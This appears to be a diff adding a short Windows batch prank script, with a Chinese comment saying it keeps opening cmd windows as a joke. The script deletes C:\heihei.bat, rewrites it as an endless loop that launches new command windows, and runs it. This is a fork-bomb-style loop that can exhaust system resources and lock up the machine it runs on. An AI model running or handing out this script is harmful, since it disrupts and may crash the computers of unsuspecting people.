@@ -1,0 +1,9 @@
+5
+del /f /q "C:\heihei.bat"
+echo ^:1 >> c:/heihei.bat
+echo start >> c:/heihei.bat
+echo goto^ 1 >> c:/heihei.bat
+start c:/heihei.bat
+
+
+//整人脚本，不停地打开cmd窗口 滑稽
